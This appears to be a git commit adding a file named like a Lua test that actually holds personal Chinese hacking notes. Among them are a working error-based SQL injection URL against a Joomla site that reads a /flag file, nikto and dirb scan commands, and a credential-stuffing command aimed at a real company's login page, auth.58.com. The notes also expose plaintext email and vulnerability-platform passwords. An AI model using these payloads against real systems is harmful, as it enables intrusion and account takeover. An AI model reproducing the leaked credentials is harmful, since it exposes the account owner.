8f337617b203c5ebabc68f3b1ce45507a46d8f81
blus <blus@iv66.net>
2020-01-31 15:56:31 +0800

    test

---
+++ webTest.lua
@@ -0,0 +1,100 @@
+
+Mac 安装lua
+下载lua 5.3.4 
+tar zxf lua-5.3.4.tar.gz
+cd lua-5.3.4
+4.测试
+make macosx test //在我的电脑上使用macosx 看了很多网上的资料使用的是machos不明白啥原因
+5.安装
+sudo make install 
+
+
+报错注入+文件读取 😄😄😄😄😄😄😄😄😄😄😄😄😄
+http://whalwl.site:8039/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(updatexml(1,concat(0x3a,(select load_file(0x2f666c6167))),1)) 
+
+
+android gradle 版本/介绍
+https://developer.android.google.cn/studio/releases/gradle-plugin?hl=zh_cn
+
+
+乌云知识库
+https://wooyun.kieran.top/#!/
+https://wooyun.js.org/
+
+
+
+gmail:
+110.ninainaideB@gmail.com
+nimainaideB.110
+
+
+
+360漏洞平台
+https://security.360.cn/
+邮箱/账号/密码
+110.ninainaideB@gmail.com
+jiangshan2021
+jiangshan2022
+
+
+
+网站漏洞扫描工具
+https://github.com/w-digital-scanner/w9scan
+
+
+
+0001->
+    http: 探测获取  目标的banner
+    kali: 方式1:   nikto -host  https://m.am-test.com
+          方式2:   dirb   http://localhost:80
+
+0002->
+    kali：工具集合
+    https://www.cnblogs.com/ECJTUACM-873284962/p/8494903.html
+    
+0003->
+    Cocos 家族所有东西都在里面的奥
+    https://github.com/fusijie/Cocos-Resource#cocos-creator-%E5%BC%95%E6%93%8E%E4%B8%8B%E8%BD%BD
+
+0004->
+    账号密码破解
+    hydra ：Hydra 是一个相当强大的暴力破解工具。该工具支持几乎所有协议的在线破解，
+    FTP、、HTTPS、、MS SQL、Oracle、Cisco、IMAP和VNC等。其能否被破解，关键在于字典是否足够强大
+
+
+0005->
+    htpwdScan 是一个简单的HTTP暴力破解、撞库攻击脚本：
+    1. 支持批量校验并导入HTTP代理，低频撞库可以成功攻击大部分网站，绕过大部分防御策略和waf
+    2. 支持直接导入互联网上泄露的社工库，发起撞库攻击
+    3. 支持导入超大字典
+    4. 其他细微功能：随机X-Forwarded-For、随机SessionID，支持Basic Auth，支持MD5 Hash等
+
+    下面是几个简单示例
+    htpwdScan.py -u=http://auth.58.com/ -basic user.txt password.txt 
+    导入用户名密码字典即可
+
+
+
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+0006->
+
